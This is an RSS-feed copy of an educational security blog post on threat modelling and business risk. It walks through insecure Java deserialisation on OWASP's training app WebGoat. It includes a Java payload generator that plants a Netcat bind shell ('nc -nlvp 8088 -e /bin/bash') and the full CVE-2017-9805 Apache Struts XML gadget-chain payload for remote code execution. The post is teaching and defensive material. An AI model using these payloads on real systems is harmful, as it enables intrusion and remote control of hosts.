@@ -1,0 +1,475 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Threat Modeling &#8211; Spencer Drayton</title>
+	<atom:link href="./index.html" rel="self" type="application/rss+xml" />
+	<link>./../../../index.html</link>
+	<description>Information Security, Software Engineering</description>
+	<lastBuildDate>Mon, 13 Sep 2021 14:11:02 +0000</lastBuildDate>
+	<language>en-GB</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	
+	<item>
+		<title>Software Vulnerabilities and Business Risk</title>
+		<link>./../../../insecure-deserialisation/index.html</link>
+		
+		<dc:creator><![CDATA[spen440]]></dc:creator>
+		<pubDate>Tue, 24 Aug 2021 17:07:37 +0000</pubDate>
+				<category><![CDATA[Application Security]]></category>
+		<category><![CDATA[Business Risk]]></category>
+		<category><![CDATA[Insecure Deserialisation]]></category>
+		<category><![CDATA[Java]]></category>
+		<category><![CDATA[Lateral Movement]]></category>
+		<category><![CDATA[Threat Modeling]]></category>
+		<guid isPermaLink="false">./../../../index.html?p=374</guid>
+
+					<description><![CDATA[For developers working with systems exposed to the internet, it&#8217;s difficult to avoid the influence that information security has on day to day work. Perhaps a recent penetration test by a third party has highlighted vulnerabilities that need addressing, or maybe the system has already suffered a security breach. There might be a requirement to [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<p>For developers working with systems exposed to the internet, it&#8217;s difficult to avoid the influence that information security has on day to day work. Perhaps a recent penetration test by a third party has highlighted vulnerabilities that need addressing, or maybe the system has already suffered a security breach. There might be a requirement to demonstrate that the system is compliant with a particular security standard. Its also possible that the development team belongs to an enlightened organisation that understands why their software products need to be secure, and have measures in place within their development process to prevent and detect security vulnerabilities.</p>
+
+
+
+<p>Conversely, if a system is designed to sit in apparent safety behind a firewall, or on a separate internal network segment, or has no direct access to sensitive data, it&#8217;s not straightforward from a developer&#8217;s point of view to see how &#8211; or why &#8211; a system might be attacked.</p>
+
+
+
+<span id="more-374"></span>
+
+
+<h2 class="simpletoc-title">Table of Contents</h2>
+<ul class="simpletoc-list">
+<li><a href="#background">Background</a>
+
+</li>
+<li><a href="#defence-in-depth">Defence In Depth</a>
+
+</li>
+<li><a href="#context-is-king">Context is king</a>
+
+</li>
+<li><a href="#threat-modelling">Threat Modelling</a>
+
+</li>
+<li><a href="#risk">Risk</a>
+
+</li>
+<li><a href="#how-software-vulnerabilities-contribute-to-risk">How software vulnerabilities contribute to risk</a>
+
+
+<ul><li>
+<a href="#insecure-deserialisation">Insecure Deserialisation</a>
+
+</li>
+<li><a href="#java-serialisation">Java serialisation</a>
+
+</li>
+</ul>
+<li><a href="#unsafe-java-deserialisation-using-webgoat-as-an-example">Unsafe Java deserialisation using WebGoat as an example</a>
+
+
+<ul><li>
+<a href="#explanation-of-the-vulnerability">Explanation of the vulnerability</a>
+
+</li>
+<li><a href="#exploitation">Exploitation</a>
+
+</li>
+</ul>
+<li><a href="#deserialisation-vulnerabilities-in-the-wild">Deserialisation Vulnerabilities In The Wild</a>
+
+
+<ul><li>
+<a href="#cve20179805">CVE-2017-9805</a>
+
+</li>
+</ul>
+<li><a href="#summary">Summary</a>
+</li></ul>
+
+<h2 class="wp-block-heading" id="background">Background</h2>
+
+
+<p>Failure to understand how one vulnerable system can be commandeered to act as a link in an attack which chains multiple compromised systems together to achieve the attackers ultimate objective can lead to software security considerations being given low or even zero priority during development.</p>
+
+
+
+<p>Until recently, responsibility for information security tended to fall squarely within the remit of systems and infrastructure engineers. A common misconception is that the firewalls, endpoint security, intrusion prevention and detection controls, etc in place absolve developers of any need to think about security. But analysis of data breaches in recent years shows that attackers are now more than capable of exploiting software system vulnerabilities to bypass security controls.</p>
+
+
+
+<p>As a result, software developers now have a responsibility to take security seriously. But for those more used to story driven development, delivering functionality which satisfies user requirements on time and on budget, it can be very challenging to switch mindsets and start thinking like an attacker.</p>
+
+
+<h2 class="wp-block-heading" id="defence-in-depth">Defence In Depth</h2>
+
+
+<p>Security breaches can involve the compromise of several hosts across an internal network, with some hosts merely acting as an intermediate stepping stone in the chain of compromise. Just because an application doesn&#8217;t directly access high value information assets, it doesn&#8217;t mean that the underlying host can&#8217;t be used as a means of gaining access to the hosts that <em>do</em>.</p>
+
+
+
+<p>Maybe the information that the application manipulates isn&#8217;t considered a likely target, but that&#8217;s of little consequence if the software introduces vulnerabilities which, for example, allow the host file system to be used as a staging area for the exfiltration of sensitive data exfiltration, or permits arbitrary script execution which allows system account password hashes to be harvested remotely and cracked offline.</p>
+
+
+
+<p>Rather than assuming that infrastructure security controls will deal with every attack, taking a defence-in-depth approach not only protects local information assets but also plays a part in protecting the wider system &#8211; hindering, delaying and maybe even halting an attacker who is trying to move laterally through a network to reach the high value targets.</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/lat-move-001-1.png"><img fetchpriority="high" decoding="async" src="./../../../wp-content/uploads/2021/09/lat-move-001-1-768x675.png" alt="" class="wp-image-465" width="571" height="501" srcset="./../../../wp-content/uploads/2021/09/lat-move-001-1-768x675.png 768w, ./../../../wp-content/uploads/2021/09/lat-move-001-1-300x264.png 300w, ./../../../wp-content/uploads/2021/09/lat-move-001-1-210x185.png 210w, ./../../../wp-content/uploads/2021/09/lat-move-001-1.png 874w" sizes="(max-width: 571px) 100vw, 571px" /></a><figcaption><em>Over-reliance on perimeter, infrastructure based security controls can expedite an attacker&#8217;s lateral movement through a network.</em></figcaption></figure></div>
+
+
+
+<div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-flow wp-block-group-is-layout-flow"><h2 class="wp-block-heading" id="context-is-king">Context is king</h2>
+
+
+<p>It&#8217;s important to view software system vulnerabilities in the context of the environment in which the system is deployed. Ultimately, the severity of a given software vulnerability should be assessed according to the risk it represents to the business, and this can vary depending on a number of factor environmental and temporal factors. A service which is vulnerable because it has a weak user authentication mechanism (for example) represents a high level risk if it is publicly accessible directly from the internet, but a lower level of risk if it is deployed on an isolated network accessible via a terminal located behind a locked door.</p>
+
+
+
+<p>Understanding how a software system interacts with its host environment, and analysing all the different ways in which those interactions could be compromised &#8211; a process commonly known as <a href="https://owasp.org/www-community/Threat_Modeling"><span class="has-inline-color has-luminous-vivid-amber-color">Threat Modelling</span></a> &#8211; is a crucial part of this process.</p>
+
+
+<h2 class="wp-block-heading" id="threat-modelling">Threat Modelling</h2>
+
+
+<p>Threat modelling is a type of risk assessment methodology, similar in concept to techniques used in other engineering disciplines such as <a href="https://en.wikipedia.org/wiki/Failure_mode,_effects,_and_criticality_analysis"><span class="has-inline-color has-luminous-vivid-amber-color">Failure Mode and Effect Criticality Analysis (FMECA)</span></a>.</p>
+
+
+
+<p>Threat modelling involves activities which include:</p>
+
+
+
+<ul class="wp-block-list"><li>Identifying and classifying information assets according to sensitivity and value.</li><li>Determining which information assets are potentially exposed by a software vulnerability.</li><li>Considering what types of threat the system is likely to face in service.</li><li>Assessing the likelihood of each type of threat being able to exploit a vulnerability.</li><li>Assessing the impact on the business of an information asset being breached by a threat successfully exploiting a vulnerability.</li></ul>
+
+
+
+<p>This process allows an organisation to categorise known software vulnerabilities in terms of the business risk that they actually represent in the target deployment environment. Armed with this knowledge, an organisation can then rank vulnerabilities by criticality and select an appropriate order and method of treatment to reduce overall business risk to an acceptable level.</p>
+</div></div>
+
+
+
+<div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-flow wp-block-group-is-layout-flow"><h2 class="wp-block-heading" id="risk">Risk</h2>
+
+
+<p>So what do we mean by risk ?</p>
+
+
+
+<ul class="wp-block-list"><li>IT organisations deal with <span class="has-inline-color has-white-color">information </span>&#8211; i.e. facts and figures which have meaning in a specific context.</li><li><span class="has-inline-color has-white-color">Information </span>within an organisation is typically viewed as a collection of <span class="has-inline-color has-white-color">assets</span>, where each asset has a <span class="has-inline-color has-white-color">value </span>which reflects its importance to the organisation.</li><li>This <span class="has-inline-color has-white-color">value </span>can be derived from many factors, but is generally proportional to the seriousness of sustaining a degradation to one of three properties used to express the security state an information asset, namely: <span class="has-inline-color has-white-color">Confidentiality</span>, <span class="has-inline-color has-white-color">Integrity </span>and <span class="has-inline-color has-white-color">Availability </span>(or &#8220;<strong><a href="https://www.iso.org/obp/ui/#iso:std:iso-iec:27000:ed-5:v1:en:term:3.28"><span class="has-inline-color has-luminous-vivid-amber-color">CIA</span></a></strong>&#8220;).</li><li>These properties can be degraded through a variety of possible scenarios involving potential <span class="has-inline-color has-white-color">threats</span>, each of which needs to be assessed to quantify its contribution to the potential business risk to the organisation.</li><li>Information systems can contain flaws, or <span class="has-inline-color has-white-color">vulnerabilities</span>, which can adversely affect the <span class="has-inline-color has-white-color">CIA</span><strong><span class="has-inline-color has-white-color"> </span></strong>of the information <span class="has-inline-color has-white-color">assets </span>it manipulates.</li><li>The level of <span class="has-inline-color has-white-color">risk </span>is assessed by considering how <span class="has-inline-color has-white-color">likely </span>it is that a <span class="has-inline-color has-white-color">threat </span>will <span class="has-inline-color has-white-color">exploit </span>a <span class="has-inline-color has-white-color">vulnerability</span> and what the <span class="has-inline-color has-white-color">impact </span>could be given the <span class="has-inline-color has-white-color">value </span>of affected information <span class="has-inline-color has-white-color">asset</span>.</li><li><span class="has-inline-color has-white-color">Vulnerabilities </span>present in software systems expose the organisation to <span class="has-inline-color has-white-color">risk </span>in a number of ways, including:<ul><li><em>Financial loss</em></li><li><em>Operational capacity reduction</em></li><li><em>Legal or regulatory penalties</em></li><li><em>Reputational damage</em></li><li><em>Harm or damage to persons and property.</em></li></ul></li></ul>
+
+
+
+<p></p>
+</div></div>
+
+
+<h2 class="wp-block-heading" id="how-software-vulnerabilities-contribute-to-risk">How software vulnerabilities contribute to risk</h2>
+
+
+<p>There are institutions within the information security community that collate and distribute guidance aimed at improving information security.</p>
+
+
+
+<p>One of these is the <span class="has-inline-color has-white-color">Open Web Application Security Project</span> (<a href="https://owasp.org/"><span class="has-inline-color has-luminous-vivid-amber-color">OWASP</span></a>), which provides &#8211; amongst many other things &#8211; a ranking of and remediation guidance for the <a href="https://owasp.org/www-project-top-ten/"><span class="has-inline-color has-luminous-vivid-amber-color">top 10 most critical web application security risks</span></a>.</p>
+
+
+
+<p>To understand how software vulnerabilities contribute to business risk, it&#8217;s worth picking one item from the 2017 version of the OWASP top 10 list and using it to outline a simple example, to help give some context to what can seem like quite an abstract concept. I&#8217;ve chosen &#8220;<a href="A8:2017 - Insecure Deserialisation"><span class="has-inline-color has-luminous-vivid-amber-color">A8:2017 &#8211; Insecure Deserialisation</span></a>&#8221; in this instance<span class="has-inline-color has-vivid-red-color">*</span>. There are countless other possible examples that would also fit here, but I&#8217;ve chosen this one because it seems easier to attribute the link between cause and effect directly to coding flaws, compared to some of the other risks types identified by OWASP. </p>
+
+
+
+<p><span class="has-inline-color has-vivid-red-color">*</span><em>The 2021 version of the OWASP Top 10 which was in peer review at the time of writing proposes merging Insecure Deserialisation into a new more general category entitled &#8220;A08:2021-Software and Data Integrity Failures&#8221;.</em></p>
+
+
+<h3 class="wp-block-heading" id="insecure-deserialisation">Insecure Deserialisation</h3>
+
+
+<p>Serialisation has a multitude of uses &#8211; one of these is to facilitate the communication of objects in distributed architectures, such as <a href="https://www.corba.org/"><span class="has-inline-color has-luminous-vivid-amber-color">CORBA</span></a>, <a href="https://docs.oracle.com/javase/tutorial/rmi/overview.html"><span class="has-inline-color has-luminous-vivid-amber-color">RMI</span></a><span class="has-inline-color has-luminous-vivid-amber-color"> </span>and <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/86b9cf84-df2e-4f0b-ac22-1b957627e1ca"><span class="has-inline-color has-luminous-vivid-amber-color">DCOM</span></a>.</p>
+
+
+
+<p>The ability to persist the state of an object so that it can be stored, or transmitted across a network and reconstructed, allows separate components of a distributed application to interact using common objects directly, without the need to encode and decode to and from other state representations and communications protocols, and regardless of any differences in host platform.</p>
+
+
+
+<p>Serialisation is an approach that&#8217;s also used when implementing web APIs, microservices, and by client-side MVC web frameworks such as <a href="https://angularjs.org/"><span class="has-inline-color has-luminous-vivid-amber-color">AngularJS</span></a> and <a href="https://emberjs.com/"><span class="has-inline-color has-luminous-vivid-amber-color">Ember</span></a>.</p>
+
+
+
+<p>Unsafe or insecure deserialisation arises when the serialised data received by a subsystem is trusted without prejudice. If the data can be modified by, or originates from, an intermediate party and the contents are not sanitised by the recipient to eliminate any malicious payloads, then a vulnerability is introduced.</p>
+
+
+<h3 class="wp-block-heading" id="java-serialisation">Java serialisation</h3>
+
+
+<p>The Java platform contains the <a href="https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/io/Serializable.html"><span class="has-inline-color has-luminous-vivid-amber-color">Serializable</span> </a>interface &#8211; classes which implement it must provide a number of methods, one of which (<em><span class="has-inline-color has-white-color">readObject</span></em>) accepts a serialised instance of itself in the form of a <span class="has-inline-color has-white-color"><em>ObjectInputStream</em> </span>object.</p>
+
+
+
+<p>This method deserialises the passed-in serialised object, obtaining from it attribute values which are used to populate a new empty instance of the class, effectively re-creating the original object in memory. This object can then be interacted with in the same way as objects generated in the &#8220;usual&#8221; way by the JVM at runtime from compiled bytecode.</p>
+
+
+
+<p>This mechanism might be used within a distributed component architecture, allowing disparate subsystems using serialised objects to communicate over a network. It could be viewed as painless  way of passing commands from one subsystem to a remote, subordinate subsystem without having to worry about conversion between communications protocols.</p>
+
+
+
+<p>However, this immediately introduces an unsafe deserialisation vulnerability &#8211; one which may seem negligible in a trusted environment, but which can lead to significant risk if the serialised data passed in to the system can be accessed (or even originated) by attackers.</p>
+
+
+<h2 class="wp-block-heading" id="unsafe-java-deserialisation-using-webgoat-as-an-example">Unsafe Java deserialisation using WebGoat as an example</h2>
+
+
+<p>To try and help demonstrate this concept, I&#8217;ve used <strong><a href="https://owasp.org/www-project-webgoat/"><span class="has-inline-color has-luminous-vivid-amber-color">WebGoat</span> </a></strong>&#8211; a deliberately insecure, open source Java web application developed by<span class="has-inline-color has-white-color"> <a href="https://owasp.org/"><span class="has-inline-color has-luminous-vivid-amber-color">OWASP</span></a> </span>to act as a training aid for developers and security technologists.</p>
+
+
+
+<figure class="wp-block-image size-large"><a href="./../../../wp-content/uploads/2021/09/az-webgoat.jpg"><img decoding="async" width="1024" height="648" src="./../../../wp-content/uploads/2021/09/az-webgoat-1024x648.jpg" alt="" class="wp-image-479" srcset="./../../../wp-content/uploads/2021/09/az-webgoat-1024x648.jpg 1024w, ./../../../wp-content/uploads/2021/09/az-webgoat-300x190.jpg 300w, ./../../../wp-content/uploads/2021/09/az-webgoat-768x486.jpg 768w, ./../../../wp-content/uploads/2021/09/az-webgoat-210x133.jpg 210w, ./../../../wp-content/uploads/2021/09/az-webgoat.jpg 1516w" sizes="(max-width: 980px) 100vw, 980px" /></a><figcaption><em>WebGoat running in an Azure container instance</em></figcaption></figure>
+
+
+<h3 class="wp-block-heading" id="explanation-of-the-vulnerability">Explanation of the vulnerability</h3>
+
+
+<p>The <span class="has-inline-color has-white-color">WebGoat </span>application contains a Java class <em><span class="has-inline-color has-white-color">VulnerableTaskHolder</span></em> which implements the Java <em><span class="has-inline-color has-white-color">Serializable </span></em>interface. Objects of this class have attributes which have values assigned to them before serialisation takes place. The object is then serialised, and transmitted to the remote subsystem, where it is received and deserialised causing its overidden <em><span class="has-inline-color has-white-color">readObject </span></em>method to be executed. In this particular example, the <em><span class="has-inline-color has-white-color">readObject </span></em>method expects one of its attributes to be assigned a String value representing a system command, which it then executes within a new sub-process. In other the system makes unsafe assumptions about the security of its host environment. It assumes all input will be benign and makes no attempt to sanitise the data it receives before deserialising it and executing the contents.</p>
+
+
+<h3 class="wp-block-heading" id="exploitation">Exploitation</h3>
+
+
+<p>The vulnerable method is exposed to the internet by an API endpoint. This is normally called via a form on the web client UI provided with the <span class="has-inline-color has-white-color">WebGoat</span> application. In this example however, we&#8217;ll interact with the endpoint directly via an interception proxy (<a href="https://portswigger.net/burp"><span class="has-inline-color has-luminous-vivid-amber-color">Portswigger Burp Suite</span></a>):</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large"><a href="./../../../wp-content/uploads/2021/08/burp-orig.png"><img decoding="async" width="1024" height="855" src="./../../../wp-content/uploads/2021/08/burp-orig-1024x855.png" alt="" class="wp-image-405" srcset="./../../../wp-content/uploads/2021/08/burp-orig-1024x855.png 1024w, ./../../../wp-content/uploads/2021/08/burp-orig-300x250.png 300w, ./../../../wp-content/uploads/2021/08/burp-orig-768x641.png 768w, ./../../../wp-content/uploads/2021/08/burp-orig-210x175.png 210w, ./../../../wp-content/uploads/2021/08/burp-orig.png 1151w" sizes="(max-width: 980px) 100vw, 980px" /></a><figcaption>Request to endpoint captured in Burp Suite</figcaption></figure></div>
+
+
+
+<div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-flow wp-block-group-is-layout-flow">
+<p>A scan against the target reveals an open port; if the host OS happens to have default components installed such as<span class="has-inline-color has-luminous-vivid-amber-color"> <a href="https://sourceforge.net/p/nc110/git/ci/master/tree/">Netcat</a></span>, we might be able to start a bind shell which we can interact with remotely:</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-full"><a href="./../../../wp-content/uploads/2021/08/nmap-1.png"><img loading="lazy" decoding="async" width="775" height="335" src="./../../../wp-content/uploads/2021/08/nmap-1.png" alt="" class="wp-image-410" srcset="./../../../wp-content/uploads/2021/08/nmap-1.png 775w, ./../../../wp-content/uploads/2021/08/nmap-1-300x130.png 300w, ./../../../wp-content/uploads/2021/08/nmap-1-768x332.png 768w, ./../../../wp-content/uploads/2021/08/nmap-1-210x91.png 210w" sizes="(max-width: 775px) 100vw, 775px" /></a><figcaption><em>Finding an open port on the target for the shell</em></figcaption></figure></div>
+</div></div>
+
+
+
+<p>Exploitation involves having knowledge of the structure of the vulnerable Java class. In this scenario, WebGoat is open source, so the class structure is easy to obtain, but in a real-world scenario with a closed source target, an attacker might be able to find this out for example via an exposed source code repository, or by reverse engineering the application&#8217;s Java byte code.</p>
+
+
+
+<p>Armed with this knowledge, we can write a small program which creates an instance of the vulnerable class, populates it with a malicious system command (line 34) and then serialises it:</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="java" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="true" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">package org.dummy.insecure.framework;
+
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.io.Serializable;
+import java.time.LocalDateTime;
+import java.io.ByteArrayOutputStream;
+import java.io.ByteArrayInputStream;
+import java.util.Base64;
+
+
+public class VulnerableTaskHolder implements Serializable
+{
+    private static final long serialVersionUID = 2;
+
+    private String taskName;
+    private String taskAction;
+    private LocalDateTime requestedExecutionTime;
+
+    public VulnerableTaskHolder(String taskName, String taskAction)
+    {
+        super();
+        this.taskName = taskName;
+        this.taskAction = taskAction;
+        // cater for BST time delta on the target server
+        this.requestedExecutionTime = LocalDateTime.now().minusHours(1);
+    }
+
+    public static void main(String[] args)
+    {
+        VulnerableTaskHolder go = new VulnerableTaskHolder
+            ("bind shell", "nc -nlvp 8088 -e /bin/bash");
+        try
+        {
+            ByteArrayOutputStream bos = new ByteArrayOutputStream();
+            ObjectOutputStream oos = new ObjectOutputStream(bos);
+            oos.writeObject(go);
+            oos.flush();
+            oos.close();
+            System.out.println(Base64.getEncoder()
+                .encodeToString(bos.toByteArray()));
+        }
+        catch (IOException ioe)
+        {
+            System.out.println(ioe.getLocalizedMessage());
+        }
+    }
+}</pre>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-full"><a href="./../../../wp-content/uploads/2021/08/token-1.png"><img loading="lazy" decoding="async" width="945" height="107" src="./../../../wp-content/uploads/2021/08/token-1.png" alt="" class="wp-image-412" srcset="./../../../wp-content/uploads/2021/08/token-1.png 945w, ./../../../wp-content/uploads/2021/08/token-1-300x34.png 300w, ./../../../wp-content/uploads/2021/08/token-1-768x87.png 768w, ./../../../wp-content/uploads/2021/08/token-1-210x24.png 210w" sizes="(max-width: 945px) 100vw, 945px" /></a><figcaption><em>Generating the serialised data</em></figcaption></figure></div>
+
+
+
+<p>We can then inject this serialised data into the captured HTTP request as a POST body parameter within the interception proxy, and transmit it to the endpoint, where the application will deserialise and execute it. Note that the package must match the package of the class as it is used in the target application. <em>Note:</em> <em>We also need to embed the current system time into the object &#8211; this is a requirement peculiar to WebGoat (introduced presumably to thwart attempts to solve the associated training exercise using pre-canned solutions)</em> :<span class="has-inline-color has-black-color">.</span></p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="./../../../wp-content/uploads/2021/08/burp-mod.png"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/08/burp-mod-1024x808.png" alt="" class="wp-image-406" width="720" height="568" srcset="./../../../wp-content/uploads/2021/08/burp-mod-1024x808.png 1024w, ./../../../wp-content/uploads/2021/08/burp-mod-300x237.png 300w, ./../../../wp-content/uploads/2021/08/burp-mod-768x606.png 768w, ./../../../wp-content/uploads/2021/08/burp-mod-210x166.png 210w, ./../../../wp-content/uploads/2021/08/burp-mod.png 1044w" sizes="(max-width: 720px) 100vw, 720px" /></a><figcaption><em>Captured request modified to include serialised payload</em></figcaption></figure></div>
+
+
+
+<p>If we now start a Netcat instance on our attacking host, using the IP address of the target host and the port on which the payload is listening, we should be able to establish a bind shell which will accept commands, execute them and return the subsequent output:</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-full"><a href="./../../../wp-content/uploads/2021/08/bindshell.png"><img loading="lazy" decoding="async" width="799" height="639" src="./../../../wp-content/uploads/2021/08/bindshell.png" alt="" class="wp-image-407" srcset="./../../../wp-content/uploads/2021/08/bindshell.png 799w, ./../../../wp-content/uploads/2021/08/bindshell-300x240.png 300w, ./../../../wp-content/uploads/2021/08/bindshell-768x614.png 768w, ./../../../wp-content/uploads/2021/08/bindshell-210x168.png 210w" sizes="(max-width: 799px) 100vw, 799px" /></a><figcaption><em>Using the bind shell on the target to execute system commands</em></figcaption></figure></div>
+
+
+
+<p>We have a low-privilege shell executing in the context of the WebGoat user, which only allows limited interaction with the target host. The next step would be to attempt privilege escalation to upgrade the shell to one with system privileges, which is beyond the scope of this post.</p>
+
+
+
+<p>It does demonstrate however that a simple vulnerability can give an initial foothold from which a more sophisticated attack could be launched. Compromising this host may not provide direct access  to sensitive or valuable data itself, but it could form part of a multi-stage attack, for example by being used to host an SSH tunnel between internal network segments to aid exploit upload and/or data exfiltration, as a platform for creating new system user accounts, or for launching credential harvesting phishing attacks against other internal users. </p>
+
+
+
+<p>If this this vulnerability was present in a production system, and threat modelling indicated that (a) the likelihood of exploitation was high, and (b) a high value information asset would be negatively impacted, this would expose the organisation to a very high level of risk, and as such it would be given a high priority for mitigation.</p>
+
+
+<h2 class="wp-block-heading" id="deserialisation-vulnerabilities-in-the-wild">Deserialisation Vulnerabilities In The Wild</h2>
+
+
+<p>The scenario described above is obviously a highly contrived, simplified example constructed to help illustrate a concept.</p>
+
+
+
+<p>Real-world deserialisation vulnerabilities are usually much more complicated to exploit, typically involving a cascading sequence of unsafe deserialisation operations involving many classes (also known as a &#8220;Gadget Chain&#8221;) which ultimately leads to the actual compromise.</p>
+
+
+
+<p>However, deserialisation vulnerabilities of this nature do occur in the wild &#8211; one such example is <a href="https://nvd.nist.gov/vuln/detail/cve-2017-9805"><span class="has-inline-color has-luminous-vivid-amber-color">CVE-2017-9805</span></a>, a flaw within the <a href="http://struts.apache.org/plugins/rest/"><span class="has-inline-color has-luminous-vivid-amber-color">REST Plugin</span></a> in the <a href="http://struts.apache.org/index.html"><span class="has-inline-color has-luminous-vivid-amber-color">Apache Struts</span></a> MVC Java framework which remained undiscovered for nine years until it was found by security researcher <a target="_blank" href="https://github.com/m-y-mo" rel="noreferrer noopener"><span class="has-inline-color has-luminous-vivid-amber-color">Man Yue Mo</span></a> in July 2017 and which was initially blamed in part for the <a href="https://www.equifax.co.uk/about-equifax/press-releases/en_gb/-/blog/equifax-ltd-uk-update-regarding-the-ongoing-investigation-into-us-cyber-security-incident"><span class="has-inline-color has-luminous-vivid-amber-color">Equifax data breach</span></a> in September 2017.</p>
+
+
+<h3 class="wp-block-heading" id="cve20179805">CVE-2017-9805</h3>
+
+
+<div class="wp-block-image"><figure class="aligncenter size-medium_large"><a href="./../../../wp-content/uploads/2021/08/nist-cve-2017-9805.png"><img loading="lazy" decoding="async" width="768" height="392" src="./../../../wp-content/uploads/2021/08/nist-cve-2017-9805-768x392.png" alt="NIST CVE-2017-9805" class="wp-image-392" srcset="./../../../wp-content/uploads/2021/08/nist-cve-2017-9805-768x392.png 768w, ./../../../wp-content/uploads/2021/08/nist-cve-2017-9805-300x153.png 300w, ./../../../wp-content/uploads/2021/08/nist-cve-2017-9805-1024x523.png 1024w, ./../../../wp-content/uploads/2021/08/nist-cve-2017-9805-210x107.png 210w, ./../../../wp-content/uploads/2021/08/nist-cve-2017-9805.png 1263w" sizes="(max-width: 768px) 100vw, 768px" /></a><figcaption><a href="https://nvd.nist.gov/vuln/detail/cve-2017-9805" target="_blank" rel="noreferrer noopener">https://nvd.nist.gov/vuln/detail/cve-2017-9805</a></figcaption></figure></div>
+
+
+
+<p>The vulnerable class within the plugin deserialises data passed into it in XML format without performing any sanitisation of its contents. The result is that a suitably crafted payload can be used to cause remote code execution on the host machine, in a similar way to that demonstrated above on the WebGoat application, the difference here being that the payload needs to be structured as XML data before serialisation.</p>
+
+
+
+<p>Exploiting the vulnerability involves sending an HTTP POST request to the target host, with the request body data formatted as shown in the snippet below, with the [command] placeholder on line 17 edited to contain the system command to be executed on deserialisation:</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="xml" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="true" data-enlighter-lineoffset="214" data-enlighter-title="" data-enlighter-group="">&lt;map>
+&lt;entry>
+&lt;jdk.nashorn.internal.objects.NativeString>
+&lt;flags>0&lt;/flags>
+&lt;value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
+&lt;dataHandler>
+&lt;dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
+&lt;is class="javax.crypto.CipherInputStream">
+&lt;cipher class="javax.crypto.NullCipher">
+&lt;initialized>false&lt;/initialized>
+&lt;opmode>0&lt;/opmode>
+&lt;serviceIterator class="javax.imageio.spi.FilterIterator">
+&lt;iter class="javax.imageio.spi.FilterIterator">
+&lt;iter class="java.util.Collections$EmptyIterator"/>
+&lt;next class="java.lang.ProcessBuilder">
+&lt;command>
+&lt;string>/bin/sh&lt;/string>&lt;string>-c&lt;/string>&lt;string> [command] &lt;/string>
+&lt;/command>
+&lt;redirectErrorStream>false&lt;/redirectErrorStream>
+&lt;/next>
+&lt;/iter>
+&lt;filter class="javax.imageio.ImageIO$ContainsFilter">
+&lt;method>
+&lt;class>java.lang.ProcessBuilder&lt;/class>
+&lt;name>start&lt;/name>
+&lt;parameter-types/>
+&lt;/method>
+&lt;name>foo&lt;/name>
+&lt;/filter>
+&lt;next class="string">foo&lt;/next>
+&lt;/serviceIterator>
+&lt;lock/>
+&lt;/cipher>
+&lt;input class="java.lang.ProcessBuilder$NullInputStream"/>
+&lt;ibuffer/>
+&lt;done>false&lt;/done>
+&lt;ostart>0&lt;/ostart>
+&lt;ofinish>0&lt;/ofinish>
+&lt;closed>false&lt;/closed>
+&lt;/is>
+&lt;consumed>false&lt;/consumed>
+&lt;/dataSource>
+&lt;transferFlavors/>
+&lt;/dataHandler>
+&lt;dataLen>0&lt;/dataLen>
+&lt;/value>
+&lt;/jdk.nashorn.internal.objects.NativeString>
+&lt;jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
+&lt;/entry>
+&lt;entry>
+&lt;jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
+&lt;jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
+&lt;/entry>
+&lt;/map>
+
+
+</pre>
+
+
+
+<p>A pre/post fix analysis of the vulnerable Struts REST plugin class <em><a href="https://struts.apache.org/maven/struts2-plugins/struts2-rest-plugin/apidocs/org/apache/struts2/rest/handler/XStreamHandler.html"><span class="has-inline-color has-luminous-vivid-amber-color">XStreamHandler</span></a> </em>(performed by <a href="https://www.mcafee.com/blogs/other-blogs/mcafee-labs/apache-struts-at-rest-analyzing-remote-code-execution-vulnerability-cve-2017-9805/"><span class="has-inline-color has-luminous-vivid-amber-color">Hardik Shah of McAfee Labs</span></a>) shows that pre-fix, the methods responsible for serialising to and from XML and Java objects: <span class="has-inline-color has-white-color"><em>fromObject</em> </span>and <em><span class="has-inline-color has-white-color">toObject</span>,</em> did so by creating instances of the <em><a href="https://x-stream.github.io/"><span class="has-inline-color has-luminous-vivid-amber-color">XStream</span></a> </em>XML parser class with default invocation permissions. This meant that there was no filtering being performed on the contents of the data being deserialised. Post-fix, the methods now expect an extra<em> </em>parameter of type <em><a href="https://struts.apache.org/maven/struts2-core/apidocs/com/opensymphony/xwork2/ActionInvocation.html"><span class="has-inline-color 